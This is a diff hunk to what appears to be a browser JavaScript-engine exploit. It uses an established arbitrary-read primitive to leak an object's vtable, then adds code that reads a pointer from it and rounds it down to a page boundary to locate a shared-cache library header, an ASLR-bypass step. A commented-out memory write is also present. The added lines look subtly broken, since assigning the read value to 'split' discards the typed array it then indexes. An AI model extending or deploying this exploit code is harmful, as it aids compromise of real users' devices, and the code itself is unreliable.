@@ -641,8 +641,13 @@ for (var i = 0; i < 1000; ++i) {
         //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
         var vtable = stage2.read64(m_runloop);
         print("vtable @ " + hex1(vtable));
-	var vtabledump = stage2.read(vtable,0x60);
-	print("dump" + hexdump(vtabledump));
+	var anchor = stage2.read64(vtable);
+	let split = new Uint32Array(2);
+	split = anchor
+	var hdr = split[1] - (split[1] & 0xfff);
+	print("header @ " + hex1(hdr))
+	//var vtabledump = stage2.read(vtable,0x60);
+	//print("dump" + hexdump(vtabledump));
 	//stage2.write64(hex1(vtable),0x7777);
 	//gc();
         //stage.passGC();
